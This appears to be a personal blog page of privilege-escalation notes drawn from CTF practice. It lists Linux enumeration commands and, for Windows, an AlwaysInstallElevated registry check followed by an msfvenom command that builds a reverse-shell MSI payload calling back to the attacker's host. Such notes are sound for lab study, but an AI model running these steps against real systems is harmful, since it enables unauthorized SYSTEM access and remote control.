<html>
<head>
	<title>PrivEsc</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="/CSS/blog.css">
	<link rel="stylesheet" href="/CSS/global.css">
</head>
<body class="noselect">
	<h1 id="title" class="blog_title">
		<a href="/index.html" class="homelink">
			PrivEsc
		</a>
		<div class="subtext">
		<p class="subtext-content content">These are all the ways I've encountered to do/find a privilege escalation. This is not an exhaustive list, but I've found they are quite common, at least among HTB boxes.</p>
	</div>
	</h1>
	<div id="big_wrapper" class="wordwrap">
		<div class="paragraph">
			<span id="menu_button" class="menu_item">...</span>
			<div id="menu">
				<a href="/index.html" class="menu_item">Home</a>
				<a href="/Blogs/index.html" class="menu_item">Blogs</a>
				<a href="/Blogs/TLDR/index.html" class="menu_item">TLDR</a>
				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
			</div>
			<hr>
		</div>

<div class="paragraph">
	<p id="linux" class="subtitle">Linux:</p>
<p class="content"><ul class="content"><li><span class="code">id</span><br>Better than "whoami" because it might show interesting groups.</li><li><span class="code">sudo -l</span><br>Lists all files the current user has permission to execute as root.</li><li><span class="code">find / -perm /4000 2&gt;/dev/null</span><br>Lists all files that have SUID bit set.</li><li><span class="code">getcap -r / 2&gt;/dev/null</span><br>Lists all files with capabilities.</li></ul></p>
</div>
<div class="paragraph">
	<p id="windows" class="subtitle">Windows:</p>
<p class="content"><ul class="content"><li><span class="code">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="code">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br>If both are set to 1, the system installs MSI packages as nt authority/system. Generate a reverse shell using something like msfvenom to generate a payload: <span class="code">msfvenom -p windows/x64/shell/reverse_tcp -f msi LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; &gt; hack.msi</span>.</li><li>If on an older system (or try your luck on newer systems), check for kernel exploits with Sherlock <a href="/Blogs/resources.html#privesc_sherlock" class="link">[1]</a>. Watson supersedes Sherlock, but is a pain to compile (on linux) due to the requirement of Visual Studio.</li><li>If you can determine if the system is vulnerable to a kernel exploit, it will almost definitely be in SecWiki <a href="/Blogs/resources.html#privesc_secwiki" class="link">[2]</a>.</li></ul></p>
</div>
		<br>
		<div class="paragraph">
			<hr>
			<p class="content">Last edit: 2021.09.05</p>
		</div>
	</div>
</body>
<footer>
	<script type="text/javascript" src="/JS/blog.js"></script>
</footer>
</html>
